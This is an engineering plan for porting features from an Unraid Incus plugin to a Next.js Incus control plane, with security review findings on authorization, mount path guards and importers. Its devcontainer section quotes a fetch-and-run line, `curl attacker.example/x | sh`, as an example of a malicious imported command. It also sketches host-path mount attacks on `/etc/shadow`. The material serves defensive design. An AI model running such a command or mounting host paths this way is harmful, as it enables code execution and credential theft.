# incus-unraid → incus-web Porting Plan

Research conducted against `/home/jmagar/workspace/incus-unraid` (mature Unraid plugin: classic `.plg`/shell layer + NestJS/GraphQL `unraid-api-plugin-incus` backend + Vue 3 frontend) and `/home/jmagar/workspace/incus-web` (this repo: Next.js 16 control plane + a standalone Node.js host provisioner talking to the `incus` CLI over a Unix socket). All file:line references below were verified by direct reads of both repos.

**Revision note (post engineering review):** This plan was reviewed by four independent passes (architecture, simplicity, security, performance — see §5). The review found the original scope significantly over-built relative to demonstrated need, and found 3 critical security gaps in the mutating-command and image-builder proposals. This revision trims committed scope accordingly (§6 "Not in scope"), reorders phasing to put authorization/isolation design *before* any mutating or privileged codepath (§4), and folds the review's concrete fixes into each feature section below. The original feature research (what exists in each repo, file:line references) is preserved unchanged — only the porting approach/effort/risk subsections and phasing were revised.

---

## 1. Summary

incus-unraid is the more mature product on almost every axis that touches *day-2 container lifecycle and developer ergonomics*: it has a real custom-image builder (distrobuilder-backed, with saved presets and a package-search UI), a full "Details" panel for editing per-container CPU/memory/workspace overrides, and two genuinely useful onboarding importers — `.devcontainer/devcontainer.json` and `mise.toml`/`.tool-versions` — that translate developer config into either build-time package selections or post-install commands. incus-web, by contrast, is architecturally cleaner and more production-shaped (typed provisioner contract, reverse-proxy identity, structured error codes, a real CI image-publish pipeline, ZFS golden-container cloning for fast ephemeral agent runs) but is intentionally minimal on the config-surface side: exactly one hardcoded resource profile, no per-workspace CPU/memory/device editing UI, no devcontainer or tool-versions import, and no snapshot/backup story. The one place Jacob suspected feature parity — **Tailscale autojoin** — turns out to already be implemented in incus-web, and arguably *more* robustly than incus-unraid's version (secret-file push-then-delete vs. incus-unraid's plain GraphQL-stored authkey; `tailscale serve` HTTPS exposure built in).

**Revised recommendation:** the plan's actual highest-value, lowest-risk work is the two importers (2.5, 2.6) — pure translation logic with no runtime side effects, near-verbatim portable. Ship those decoupled from any interactive build pipeline, as a parser + YAML-diff-preview tool against the existing `distrobuilder.yaml`. Everything else incus-unraid has that incus-web doesn't — the interactive Builder UI, mutating resource-limit/mount commands, a Details/Config dashboard — is real capability, but none of it has a demonstrated incus-web pain point yet, and each carries meaningful new risk (the Builder pipeline runs a privileged host-level build tool; the mutating commands would be the first non-lifecycle commands the provisioner has ever accepted, with no authorization tier to gate them). Treat those as a gated backlog, not committed scope — see §4 and §6.

---

## 2. Feature-by-feature

### 2.1 Tailscale autojoin

**incus-unraid**: Config-driven best-effort join executed via the Incus REST exec endpoint right after container launch.
- `unraid-api-plugin-incus/src/config.entity.ts:130-133,160,195` — `tsAuthKey` GraphQL field, default `""`.
- `unraid-api-plugin-incus/src/config-sync.service.ts:224,293,332` — syncs `TS_AUTHKEY` shell var ↔ GraphQL config; single-quote-escapes on write (tested at `config-sync.service.test.ts:211-213`).
- `unraid-api-plugin-incus/src/incus.resolver.ts:99-107` — inside `launchJail`, if `tsAuthKey` set: `runOnce(name, ["tailscale", "up", "--authkey=...", "--hostname=..."])`, wrapped in try/catch that only logs on failure (never blocks launch).
- `unraid-api-plugin-incus/src/incus-exec.service.ts:100-140` — `runOnce` fires a non-interactive, non-websocket exec via `/1.0/instances/<name>/exec`.
- `source/.../incus.cfg:59-63` — comment: "best-effort — an image without tailscale just skips this silently."
- ACL allowlist for Tailscale's CGNAT range `100.64.0.0/10` baked into the default block-list exclusions (`README.md:81`, `incus.cfg:27-28`, `App.vue:2759-2761`).
- UI: single password-style input on the Config tab (`App.vue:2741-2764`). No key rotation, no OAuth client flow, no per-container tags/ACLs — flat static authkey.

**incus-web**: Already implemented, and more thorough. Confirmed via `grep -rni tailscale` across the whole repo.
- `scripts/incus-web-lib.sh:1502-1517` — `ensure_tailscale_installed()`: installs via `curl -fsSL https://tailscale.com/install.sh | sh`, writes `/etc/default/tailscaled` with `--tun=userspace-networking` (needed for unprivileged/nested containers), enables the service.
- `scripts/incus-web-lib.sh:348-366` — `push_tailscale_env()`: writes `TS_AUTHKEY`/`TS_HOSTNAME`/`TS_EXTRA_ARGS`/`TAILSCALE_SERVE_PORT`/`WETTY_PORT` to a temp file, pushes via `incus file push` to `/etc/incus-web/tailscale.env` (mode 600) — the secret never lives in Incus config/GraphQL storage the way incus-unraid's `tsAuthKey` does.
- `scripts/incus-web-lib.sh:1655-1670` — `join_tailnet_and_serve()`: runs `tailscale up --authkey=... --hostname=...`, then `tailscale serve --bg --https=<port> http://127.0.0.1:<wetty-port>` to HTTPS-expose the in-container terminal, then deletes the pushed secret file.
- `scripts/incus-web-lib.sh:1672-1687` — `configure_access()` dispatches to Tailscale vs OIDC/oauth2-proxy based on `ACCESS_MODE`.
- `distrobuilder.yaml:170-172` — Tailscale binary/service installed at image-build time but deliberately **not** joined (`README.md:301`: "Do not build an image with `/var/lib/tailscale` already populated... cloned containers should join with their own node identity") — join always happens per-container at deploy time.
- `deploy.sh:141` — `require_var TS_AUTHKEY` when `ACCESS_MODE=tailscale`.

**Porting approach**: None needed for core functionality — confirm to Jacob his instinct was right, feature parity already exists and incus-web's implementation (transient secret file + `tailscale serve` HTTPS exposure) is arguably better than incus-unraid's GraphQL-stored static key. The one thing worth borrowing:
1. (Optional, S) Verify whether incus-web's network ACL (`scripts/incus-web-lib.sh:109-149` `ensure_agent_network()`) needs an explicit CGNAT (`100.64.0.0/10`) carve-out the way incus-unraid's does — Tailscale tunnels over UDP 41641/DERP rather than routing raw CGNAT traffic through the container's default route, so this may be a documentation-only "confirm, don't implement" item.
2. (New, from security review H1) Confirm the Tailscale secret-file deletion in `join_tailnet_and_serve()` happens **before** any devcontainer/mise-imported post-install command runs (2.5/2.6), not after — once importers can inject arbitrary post-install commands, the window between secret-push and secret-delete becomes a credential-exfiltration opportunity if a malicious imported command runs inside it. This is a one-line ordering check, not new code.

**Effort**: N/A (already done) / S for the ACL verification. **Risk**: none — this is a documentation/confirmation task, not new code.

---

### 2.2 The package/image builder — SCOPE CUT, see §6

**incus-unraid** has two pipelines:

*A. `.plg`/`.txz` Unraid OS package* (irrelevant to incus-web — Unraid-specific Slackware-style plugin packaging, not a pattern to port). Structure for reference: `incus.plg:1-13` (version/MD5-pinned XML entities), `:17-232` (embedded `<CHANGES>` changelog), `:234-304` (`<FILE>` lifecycle blocks: cleanup → download+MD5-verify+`upgradepkg --install-new` → post-install bash → README write → conditional service start → `Method="remove"` uninstall block). No build script exists in-repo; `CLAUDE.md:41` states repackaging is manual, "always start from the previous build's extracted contents."

*B. Custom Incus container image builder* (`unraid-api-plugin-incus/src/incus-image-builder.service.ts`) — this is the directly portable pattern:
- 6 curated distro definitions (debian/ubuntu/alpine/rocky/alma/fedora) each with mirror URL + package manager (`:46-91`).
- `renderDefinition()` (`:253-316`) builds a distrobuilder YAML definition on the fly (`image:`/`source:`/`packages:`/`targets: {incus: {}}`, plus a `post-packages` shell action block if post-install commands were added) — this is the same distrobuilder tool incus-web already drives via `scripts/build-image.sh`.
- `--import-into-incus=<alias>` flag usage (a documented past bug: the flag's value IS the alias, not a boolean — changelog `2026.07.07b`).
- Build tracking: in-memory `Map<string, ImageBuild>` (`:112`, lost on restart) + durable `image-builds.json` registry (`:207-219`) separate from Incus's own image store — supports `isMaster` (exactly one golden image, `:183-196`) and `basedOn` (variant lineage).
- Log tailing for UI polling: last 16KB of the build log (`:377-385`, `LOG_TAIL_BYTES = 16_384`).
- Package search across managers (apt/npm/PyPI/Homebrew) with `Promise.allSettled` graceful degradation and in-flight request dedup (`incus-package-search.service.ts:75-92`).
- Saveable builder presets (`incus-builder-presets.service.ts`).

**incus-web**: Already has real image-building — a CI-driven distrobuilder pipeline, not a runtime/self-serve one.
- `distrobuilder.yaml` (222 lines) — single fixed Debian Trixie recipe with a large `post-packages` hook installing Node, `gh`, Tailscale, Claude Code/WeTTY/Codex CLI via npm, creates `agent` user, enables services.
- `scripts/build-image.sh` — `distrobuilder build-incus "$DEFINITION" "$EXPORT_DIR" --type "$BUILD_TYPE"`.
- `scripts/smoke-image.sh` — imports the built image, launches a throwaway container, asserts toolchain versions.
- `.github/workflows/build-image.yml` — CI on push/PR: build, smoke-test, and on `main` republish to a rolling GitHub Release (`incus-web-agent-latest`).
- `scripts/build-agent-golden.sh` — a second, distinct mechanism: `incus copy`-clones the *live* `incus-web` container onto a ZFS pool (`labby-zfs`) for near-instant COW clones, strips credentials, used by `scripts/agent-runs.mjs` for fast ephemeral agent-run containers.

**Gap**: incus-web's image build is single-recipe, CI-only, and requires editing YAML + pushing to `main` to change anything. There is no in-app way to pick a distro, add packages, or build a variant image — everything incus-unraid's Builder tab does interactively is, in incus-web, a manual YAML edit + git push + CI wait.

**Engineering review verdict: cut from committed scope.** Three independent findings converge on the same conclusion:
- **Simplicity review**: no demonstrated incus-web pain point beyond "incus-unraid has it" — the CI pipeline works today, matches incus-web's own "production-shaped" design philosophy, and this is an L-effort speculative investment.
- **Security review (Critical C3)**: distrobuilder needs loopback mounts/debootstrap-class host privileges. incus-unraid's own pattern renders distrobuilder YAML on the fly from user-supplied strings (distro/release select, package textarea, post-install commands). If that rendering is naive string interpolation, user-controlled input becomes arbitrary command execution **in a privileged host build context**, not inside a container — a materially worse blast radius than a container escape.
- **Architecture + performance review**: distrobuilder builds run for minutes; the provisioner's existing command model is synchronous with an 8s timeout and only 4 global concurrency slots (`acquireIncusSlot()` in `provisioner-server.mjs`). Bolting a build job onto that model as "just another command" would have 1-2 concurrent builds starve every other user's start/stop/restart for the build's full duration. The proposed file-backed build registry would also inherit `agent-runs.mjs`'s existing O(n) full-file-rewrite-per-append pattern (confirmed at `scripts/agent-runs.mjs` `readRuns`/`writeRuns`), which degrades as build/log history grows — log-tail polling would make this the hottest write path in the whole provisioner.

**If this is ever built** (only after a specific, named pain point emerges from actually using the CI pipeline — e.g., "I needed a variant image and the YAML-edit-and-wait loop cost me real time three times this month"), the implementation must NOT be "distrobuilder invocation as just another provisioner command." Required design constraints, in order:
1. Isolation boundary first: distrobuilder must run in a separate, unprivileged worker process/sandbox (dedicated service account with no other host access, or a locked-down VM/gVisor) — never in the same provisioner process that holds the bearer token for all lifecycle commands. A compromised builder must not be able to reach container-lifecycle capabilities.
2. Structured YAML construction only (a real YAML library building nodes programmatically), never string-template interpolation of user input into YAML/shell. Distro/release must be a strict allowlist; package names validated against each distro's actual package index, not free-text.
3. `BuildImage` modeled as an explicit async dispatch (`DispatchBuildImage` returns an operation id immediately) + poll (`GetBuildStatus`) pair from day one, using the existing but currently-unused `queued/running/succeeded/failed` `OperationStatus` shape — never synchronous request/response.
4. Build jobs must run outside `acquireIncusSlot()`'s 4-slot pool entirely (a separate semaphore, or none, since they're already async/polled) so they can never starve lifecycle commands.
5. Idempotency key required on `DispatchBuildImage` (reuse the existing `requestId` field if made dedup-capable) — a retried request against a privileged, minutes-long operation is a realistic and costly failure mode otherwise.
6. Build registry: not a single growing JSON file with full-file rewrite per log append. At minimum, split logs into a separate append-only file per build (or track a byte offset) rather than growing one JSON array's `logs` field forever. SQLite with a single-writer lock is the safer default if build history needs to be queryable.
7. Log-tail polling keyed by unguessable build ID (UUID, not sequential) with the same per-actor ownership check as every other workspace-scoped route (security review H3) — build logs can contain secrets echoed during package install.
8. Log-tail polling uses a client-supplied byte offset, not a flat 16KB re-read every poll (performance review recommendation) — avoids re-parsing a growing log store on every 2-3s tick.
9. `isMaster`/`basedOn` variant tracking, package-search-across-managers, and saveable presets (incus-unraid's steps 4-5) stay cut regardless — no evidence they're needed for the actual objective (getting devcontainer/mise import working), and package-search specifically needs a per-query-string TTL cache in addition to in-flight dedup if it's ever built (external registry latency, no local concurrency guard).

**Effort if built properly**: L, and larger than the original estimate once isolation/async/registry-durability work is included — treat as a dedicated future initiative, not a phase item. **Status**: not scheduled; revisit only on a demonstrated trigger.

---

### 2.3 Dashboard — TRIMMED, see §6

**incus-unraid**: One Vue 3 SFC (`unraid-api-plugin-incus/web/src/App.vue`) compiled to a custom element, embedded in Unraid's classic PHP settings page (`source/usr/local/emhttp/plugins/incus/IncusSettings.page`). Three tabs:
- **Containers**: live list with CPU/memory usage columns (from `Jail.cpuUsageNs`/`memoryUsageBytes`, `config.entity.ts:199-209`, populated by `IncusService.listJails()` reading `/1.0/instances?recursion=2`), Launch form (image dropdown), per-container **Details** panel (image OS/release, storage pool, network bridge, effective CPU/memory limits with override badges, `/workspace` host path — each independently overridable/resettable), "Delete N stopped" bulk action.
- **Builder**: distro/release pickers, package search, saveable presets, image registry with master/variant tracking, and the devcontainer/mise import disclosures (see 2.5, 2.6).
- **Config**: every `incus.cfg` key editable via GraphQL, masonry card layout, chip-based CIDR editors.
- Exec/terminal riding GraphQL subscriptions (`graphql-ws`) rather than a separate WS gateway.
- Inherits host (Unraid) CSS variables rather than shipping its own theme.

**incus-web**: Next.js App Router dashboard (`apps/web/app/page.tsx` → `WorkspaceDashboard`), Aurora/shadcn design system.
- `apps/web/components/workspace-dashboard.tsx` — `WorkspaceCard` (state badge + read-only `StatGrid` of CPU/Memory/Storage strings, `:363-388`), `WorkspaceFeatures` (static capability grid: Terminal link, "Sharing: private", "Snapshots: none", Dotfiles status, "MCP import: ready" placeholder, "Secrets: age" — described not implemented), `SetupProgressPanel`/`SetupCheck` (Commands/Packages/mise phase tracking, `:177`), `WorkspaceInspector` sidebar (Image/Profile/Terminal/Dotfiles + static "Gate: Authelia"/"Privilege: unprivileged" badges).
- `apps/web/components/workspace-actions.tsx` — the only mutating UI: start/stop/restart.
- `apps/web/components/agent-run-dispatch.tsx` — dispatch form for ephemeral Codex/Claude agent-run containers, plus a session detail page (`apps/web/app/workspaces/[workspaceId]/agent-runs/[runId]/page.tsx`).
- Effectively single-workspace-per-actor (`primaryWorkspace = inventory.workspaces[0]`) even though the type supports an array — no multi-container list/detail navigation pattern yet.
- No dedicated metrics/logs page beyond inline setup-log excerpts and the agent-run session view.

**Gap analysis**: incus-web's dashboard is architecturally nicer (typed contract, Aurora design system, reverse-proxy identity) but functionally thinner — no per-container Details/edit panel, no Config tab equivalent (config lives in `.env`/YAML files edited by hand), no Builder tab, no multi-container list UX despite the data model supporting it.

**Engineering review verdict: trimmed.** All of items 1-4 below are UI surface for backend capability (2.2, 2.4) that's now cut or gated — building the UI first is pure speculation. Additionally:
- **Performance review**: `statusCache`/`statusInFlight` in `provisioner-server.mjs` (lines 401-421) are bare module-level variables, not a `Map` — correct only because there's currently exactly one workspace. The moment any live per-container polling (a Details panel) or multi-workspace support lands, a second workspace's status poll will collide with/invalidate the first's cache, causing cache-thrash: every poll tick falls through to a live 5-subprocess-spawn `incus` query instead of being served from cache, multiplying spawn rate by the number of open panels against the same 4-slot global concurrency pool used for everything else.
- **Security review (M2)**: any new workspace-scoped route (list/detail, especially under multi-workspace) must reuse the exact `getWorkspaceRefForActor` + ID-match pattern already correctly implemented in `apps/web/app/api/workspaces/[workspaceId]/actions/route.ts:40-42` — it is easy for a "just add a list endpoint" change to skip this and introduce an IDOR (actor A requests actor B's workspace by guessing/enumerating the ID).

**Porting approach** (revised — only proceed on items with a concrete, currently-cut-blocking dependency; everything else deferred to §6):
1. **(Prerequisite, not a phase item)** Convert `statusCache`/`statusInFlight` in `provisioner-server.mjs` from bare variables to a `Map` keyed by workspace ID. Do this *before* any Details-panel or multi-workspace work, even though it's currently harmless — this is exactly the kind of latent single-tenant assumption that silently breaks correctness (not just performance) the instant a second workspace exists.
2. (S, deferred until 2.4's `SetWorkspaceLimits` is actually built) Add a minimal Details panel showing the already-available `WorkspaceRuntimeStatus` fields (`contracts.ts:125-135`) plus editable limits, gated by the authorization-tier prerequisite in 2.4.
3. (Cut, see §6) Config tab, Builder tab, multi-workspace list+detail.

**Effort**: S for the cache-Map prerequisite (do regardless of what else ships). Everything else deferred. **Risk**: low for the cache fix in isolation; the deferred items carry the scope-creep risk the original plan itself flagged — confirm with Jacob whether multi-workspace and full Config-tab parity are actually wanted before investing.

---

### 2.4 Container configuration exposure (limits, devices, mounts, env vars) — AUTHORIZATION IS A BLOCKING PREREQUISITE

**incus-unraid**: Full CRUD via GraphQL + REST-PATCH to Incus.
- CPU/memory: `incus.service.ts:330-344` `setJailLimits(name, cpu?, memory?)` — PATCHes `config["limits.cpu"]`/`config["limits.memory"]` directly on the instance (empty string clears override, falling back to profile value via Incus's own config-unset semantics). Client-side validated before save (changelog `2026.07.07q`).
- Global defaults templated into the profile: `JAIL_CPU`/`JAIL_MEMORY` in `incus.cfg:41-42`, substituted via `sed` in `incus-init.sh:220-231` against `agent-jail-profile.yaml.tmpl:9-10` (empty = the whole limits line is `grep -v`-stripped, so "no cap" is a real absent key, not `0`).
- Workspace mount: modeled as an Incus `disk` device (`type: disk, source: <host-path>, path: /workspace, shift: "true"`). `ensureInstanceWorkspaceDir()` (`incus.service.ts:282-291`, path-traversal guarded), per-instance override at launch so containers don't share writes (bugfix changelog `2026.07.07n`), `setWorkspace()`/`clearWorkspaceOverride()` (`:306-328`, full-map PATCH — omitting the key removes the override, empty string does not), `migrateToOwnWorkspace()` one-click fix (`:293-304`).
- Extra host bind-mounts: `JAIL_BIND_MOUNTS` config key (`incus.cfg:54-57`, comma-separated `host:container[:ro]` triples) — declared/synced in `config.entity.ts:125-128`; the exact device-creation consumption should be re-confirmed directly in `incus-init.sh` before porting.
- Env vars: no dedicated per-container env UI — only cloud-init `write_files`/`runcmd` baked into the profile template at launch, and build-time `postInstallCommands` in the image builder.

**incus-web**: Confirmed **read-only, no edit surface at all**.
- `ResourceProfileId` is a hardcoded literal `"local-dev"` (`apps/web/lib/provisioner/contracts.ts:70`) — exactly one profile, not selectable.
- `WorkspaceRuntimeStatus` (`contracts.ts:125-135`) exposes `cpuCount?/memoryUsedBytes?/memoryLimitBytes?/rootDiskUsedBytes?/rootDiskLimitBytes?/loadAverage?` — outbound-only, from `getWorkspaceStatus()` (`provisioner-server.mjs:354-399`).
- `PROVISIONER_COMMAND_TYPES` (`contracts.ts:3-12`) has no update/config command — only `CreateWorkspace, StartWorkspace, StopWorkspace, RestartWorkspace, GetWorkspaceStatus, RunSetup, DispatchAgentRun, ListAgentRuns`.
- Actual limits are set once at deploy time in `incus-web-profile.yaml:17-21` (`limits.cpu: "2"`, `limits.memory: 4GiB`, etc.) and only overridden by hand-editing that YAML or via `scripts/smoke-image.sh:81-84`'s `incus config set` calls — never through the web app.
- Devices (NIC, workspace disk) are profile-YAML + `deploy.sh:210-211` runtime-override only (`incus_cmd config device override ... eth0 network=... / ... workspace source=... path=... shift=...`).

**Engineering review verdict: this is the first genuinely mutating, non-lifecycle command incus-web would ever add, and the original plan's own risk note ("worth extra scrutiny on the auth path") undersold how blocking that scrutiny needs to be.**

- **Security review (Critical C1)**: today's authorization is binary — an actor either *is* the single configured owner of the one workspace (`getWorkspaceRefForActor` in `apps/web/lib/workspaces/provisioner.ts`), or gets 404/401. There is no role distinction between "can start/stop my own workspace" and "can rewrite its CPU/memory limits or attach arbitrary host paths." If `SetWorkspaceLimits`/`SetWorkspaceMount` ship using the same check as `start`/`stop`, **any actor who can start their workspace can also uncap its resources or mount host paths in, from day one.** Concretely dangerous under `INCUS_WEB_ALLOW_SHARED_PROTOTYPE=1` (multi-actor mode): a lower-trust invited user could mount `/` or `/etc` from the Incus host and read `/etc/shadow`, SSH host keys, or the provisioner's own bearer token file through the container filesystem — host compromise from a workspace-scoped identity.
- **Security review (Critical C2)**: the original plan's "port the path-traversal guard" treats the guard as a known portable artifact; it isn't specified what it actually restricts. Incus disk devices accept arbitrary host paths — the guard is doing all the security work and needs a concrete spec, not a citation.
- **Security review (M1)**: the original plan states limits use "empty/absent clears override" while mounts use "omit-clears, empty-does-not-clear" — two different clear semantics for two new commands in the same feature. If the ported implementation conflates them, the UI can show "cleared" while Incus still holds a stale privileged override — a silent authorization-drift bug, not just a UX bug.
- **Performance review**: this part is comparatively low-risk performance-wise (single `incus config set/unset` call, same shape as existing start/stop) — but the existing `startWorkspace`/`stopWorkspace` handlers explicitly invalidate `statusCache` (`provisioner-server.mjs` lines 436, 455, 471) and the new mutating commands must do the same or the Details panel will show stale limits for up to 2s after a save.

**Porting approach** (sequenced — reordered so authorization is first, not an afterthought):
1. **(S, blocking prerequisite)** Design and document an explicit authorization tier before writing any other 2.4 code: define what capability is required to mutate limits/mounts versus just start/stop/restart, and implement the check as a function independent of (but composed with) the existing `getWorkspaceRefForActor` identity lookup — so a future multi-tenant/multi-role model doesn't require retrofitting auth onto an already-shipped mutating command. For the current single-owner deploy model, this can be as simple as an explicit `actorCanMutateWorkspaceConfig(actor, workspaceRef)` check that today just re-confirms sole-owner status, but it must exist as its own named, testable unit — not be folded silently into the existing owner check.
2. **(S)** Write the path/mount allowlist spec concretely before any mount-editing code: canonicalize with `fs.realpath`, reject any path that escapes a single allowlisted parent directory (e.g., `/var/lib/incus-web/workspaces/<id>/`), reject symlinks, and validate **on the provisioner side** (the privileged component that actually holds the trust boundary) — never trust web-tier validation alone, since the provisioner accepts whatever the web app sends over the token-authenticated channel.
3. **(S)** Add `SetWorkspaceLimits` command to the provisioner contract (`contracts.ts`) mirroring incus-unraid's semantics; implement via `incus config set <container> limits.cpu=<v>` / `limits.memory=<v>` (or `incus config unset` for clear), matching the CLI-wrapper style already used for start/stop. Gate behind the authorization check from step 1.
4. **(S)** Add client+server validation before save. Explicitly invalidate `statusCache` after the command succeeds, matching the existing `statusCache = undefined` pattern in `startWorkspace`/`stopWorkspace`.
5. **(S, required before merge)** Write a contract test asserting the exact clear semantics for `SetWorkspaceLimits` in both directions (omit-clears vs. explicit-value) before wiring any UI to it — this is a footgun the sibling repo already hit in production; verify it here rather than discovering it live.
6. **(M)** Add `SetWorkspaceMount`/`ClearWorkspaceMount` command pair for the `/workspace` device, using the path guard from step 2 and the full-map-PATCH-means-omit-to-clear semantics — write the equivalent contract test for this command's clear semantics too (per the M1 finding, mount and limit clear-semantics differ and must each be independently verified, not assumed consistent).
7. **(M)** Wire into the Details panel from 2.3, once the panel itself is justified.
8. **(S, optional, deferred)** `JAIL_BIND_MOUNTS`-equivalent — incus-web already does something similar ad hoc for agent-run credential injection (`scripts/agent-runs.mjs:270-347`); revisit only if the existing agent-run-specific mechanism proves insufficient.
9. Env vars: skip — neither repo has a compelling per-container env-var UI pattern worth porting as-is; if needed, design fresh rather than port.

**Effort**: M overall, plus the new S-effort authorization-tier prerequisite that the original plan didn't scope at all. **Risk**: was previously understated. Do not schedule this feature until step 1 (authorization tier) is designed and reviewed independently — treat it as a gate, not a checklist item alongside the rest.

---

### 2.5 Importing `.devcontainer/devcontainer.json` — DECOUPLED FROM BUILDER, PROCEED

**incus-unraid**: Fully implemented, entirely client-side (Vue), feeding into the Builder's distro/package/post-install-command state — never a new backend surface (`CLAUDE.md:51`).
- `unraid-api-plugin-incus/web/src/App.vue:1159-1339` — all logic.
- Mapping table (verified, `App.vue:1159-1302`):

| devcontainer.json field | Mapping | Lines |
|---|---|---|
| `image` | `inferDistroReleaseFromImage()` pattern-matches image string (alpine/fedora/rocky/alma/ubuntu/debian, incl. bare `node:`/`python:` tags → Debian) to set distro+release | `:1169-1201`, called `:1230-1237` |
| `build.dockerfile` | Not translated — surfaced as skipped: `"build.dockerfile" — Dockerfile-based devcontainers aren't translated, pick a distro/release manually` | `:1238-1239` |
| `features` | `mapFeatureToPrereqGroup()`: `/node`→nodejs group, `/python`→python3 group; hardcoded: any `/git` ref → adds `git` package; `/common-utils` → adds `curl, sudo, ca-certificates`; else skipped | `:1204-1212`, `:1242-1275` |
| `postCreateCommand`/`postStartCommand` (string or array) | Added as visible/editable/removable post-install-command entries, key `devcontainer:<field>:<i>` — explicitly NOT silently run (comment: these commands assume a checked-out repo, not true at image-build time) | `:1277-1292` |
| `remoteUser`/`containerUser` | Not mapped — skipped: "this plugin uses one fixed agent user (Config → Jail Defaults)" | `:1294-1296` |
| `forwardPorts`/`mounts`/`workspaceFolder` | Not mapped — skipped: "IDE/runtime concerns, not applicable to image building" | `:1297-1299` |

- JSONC tolerant (`stripJsonComments()`, `:1304-1310`) — handles `//` comments and trailing commas before `JSON.parse`.
- Result type `DevcontainerImportResult {distroSet, packagesAdded, commandsAdded, skipped}` (`:1214-1219`) — every unmapped field surfaced in the UI (`:1910-1922`), never silently dropped.
- File picker: hidden `<input type="file" accept=".json,application/json">` (`:1896-1923`).

**incus-web**: Confirmed absent. `grep -rni devcontainer` across the whole repo returns zero hits (the only "devcontainer"-adjacent file, `incus-codex-jail.md`, is a reproduced third-party blog post used as design inspiration, not related code).

**Engineering review verdict: this is the plan's actual best work — proceed, but decoupled from the (now-cut) interactive Builder.**
- **Simplicity review**: the original plan sequenced this *after* the Builder pipeline exists, dragging a genuinely small, high-value, pure-function feature into the wake of a speculative L-effort UI investment. There's no reason to wait: the importer's output (a list of packages + post-install commands) can be rendered as a diff/preview against the existing `distrobuilder.yaml` — no interactive build-and-poll pipeline required.
- **Security review (High H1, H2)**: the "never silently drop a field" design is good but only protects the parsing layer. Once approved commands are surfaced as a diff for a human to apply to `distrobuilder.yaml` (rather than auto-executed), the execution-trust question mostly goes away — but (a) when importing from a third-party/untrusted repo (not one the workspace owner authored), render the raw command text with a clear "not from you" provenance warning before the user copies it into their recipe, since `postCreateCommand` can encode `curl attacker.example/x | sh` and a one-click import UX makes it easy to not actually read a multi-line script; (b) enforce a hard file-size cap before parsing and use a well-maintained JSONC parser (not hand-rolled) — an oversized/deeply-nested `devcontainer.json` from an attacker-controlled repo is a browser-tab DoS at minimum.

**Porting approach** (revised):
1. (S) Near-verbatim, low-risk port: translate `inferDistroReleaseFromImage`, `mapFeatureToPrereqGroup`, `stripJsonComments`, and the field-mapping table directly into a TypeScript module (`apps/web/lib/import/devcontainer.ts`), same function signatures, same explicit-skip-reporting design. Add a file-size cap (e.g., 256KB) before parsing.
2. (S) Ship the output as a **diff/preview against `distrobuilder.yaml`** — a page or CLI command that takes an uploaded `devcontainer.json`, runs it through the translator, and renders "here's what I'd add to your recipe" (packages, post-install commands, skipped fields) as reviewable text/diff. No new provisioner command, no Builder UI dependency. This is the entire v1.
3. (S) Add the file-picker UI using incus-web's existing Aurora/shadcn form components.
4. (XS) Keep the "never silently drop a field" design principle — surface `skipped` reasons exactly as incus-unraid does.
5. (XS, security) When the imported file's origin isn't the workspace owner's own project (i.e., importing on behalf of a cloned third-party repo), show a "review before applying — this command comes from an external source" warning on any `postCreateCommand`/`postStartCommand` entry before it's copied into the recipe diff.

**Effort**: S (pure logic port + a diff-preview UI, no longer blocked on anything). **Risk**: minimal — copy-adapt-test, plus the two small security additions above (size cap, provenance warning). Only judgment call: 6-distro coverage vs starting narrower (Debian/Ubuntu, matching incus-web's actual production image — recommend starting narrower).

---

### 2.6 Importing `.tool-versions` (and `mise.toml`) — DECOUPLED FROM BUILDER, PROCEED

**incus-unraid**: Fully implemented, client-side, feeding the same Builder post-install-command pipeline as devcontainer import.
- `App.vue:1340-1490`.
- Design rationale (`:1340-1352`): mise/asdf pins don't map to OS packages (apt rarely has the exact version, doesn't cover mise's cargo/npm/go/github-release backends) — so the correct mapping is to bake `mise` itself into the image via its official installer, system-wide (`MISE_DATA_DIR=/opt/mise`, not root's home, since the actual runtime user doesn't exist yet at build time), same reasoning that ruled out baking in Homebrew system-wide.
- `mise.toml` `[tools]` table parser: `parseMiseToolsTable()` (`:1365-1379`) — handles plain string version, array (asdf-style fallback chain, takes `value[0]`), or object with `.version` field (other extended fields like `postinstall`/`os` ignored).
- `.tool-versions` parser: `parseToolVersionsFile()` (`:1381-1394`) — line-by-line, strips `#` comments, splits whitespace as `<tool> <version> [<fallback>...]`, takes first version token only.
- Install commands generated by `ensureMiseInstalled()` (`:1396-1409`, idempotent via stable-key `Map.set`):
  ```
  mise:env      → export MISE_DATA_DIR=/opt/mise MISE_CONFIG_DIR=/etc/mise
  mise:install  → curl https://mise.run | MISE_INSTALL_PATH=/usr/local/bin/mise sh
  mise:profile  → writes /etc/profile.d/mise.sh (env exports + eval "$(mise activate bash)")
  ```
  Also ensures `curl`/`ca-certificates` packages and a `build-tools` prereq group.
- Tool pinning: `applyMiseToolPairs()` (`:1411-1417`) — one combined `mise use -g <tool>@<version> ...` command, key `mise:use-tools`.
- Dotfiles bootstrap (experimental, riding the same mise install): given a git URL, `git clone --depth 1 [--branch <ref>] <url> /opt/dotfiles-src`, copies any `mise.toml` from the clone into `/etc/mise/config.d/dotfiles.toml`, runs `MISE_EXPERIMENTAL=1 mise bootstrap --yes || true` (`:1458-1490`).
- Explicitly rejected: `mise oci build` (produces OCI/Docker images, not the LXC format distrobuilder needs — changelog `2026.07.07h`).
- UI: two file pickers sharing one result panel (`:1929-1958`).

**incus-web**: `mise` exists, but only as the *agent's own* per-user dev-environment bootstrap (parallel to the user's personal dotfiles/chezmoi setup) — not a project-`.tool-versions`-aware importer. No asdf/`.tool-versions` support (`grep -rni "tool-versions\|asdf"` returns zero hits).
- `DOTFILES_RUN_MISE` env var (`README.md:251`, `.env.example:116`) — "1 = install mise for the terminal user and run `mise install` after dotfiles apply."
- `scripts/incus-web-lib.sh:1482-1496` — installs mise via `curl -fsSL https://mise.run | sh`, runs `mise install` (picks up whatever config the user's own dotfiles/chezmoi bring, not a specific project's `.tool-versions`).
- `scripts/bootstrap-server.mjs:201,238,246` — same pattern in the `/setup/` web flow.
- `apps/web/components/workspace-dashboard.tsx:177` — dashboard already shows mise install status as one of three setup checks (`SetupCheck label="mise"`).
- `openwiki/workflows/workspace-lifecycle.md:26,43,199-203` — documents `installing_mise` as a lifecycle phase.

**Engineering review verdict: proceed, same rationale as 2.5 — decouple from Builder, ship as a runtime-config-seed rather than a build-time bake.**
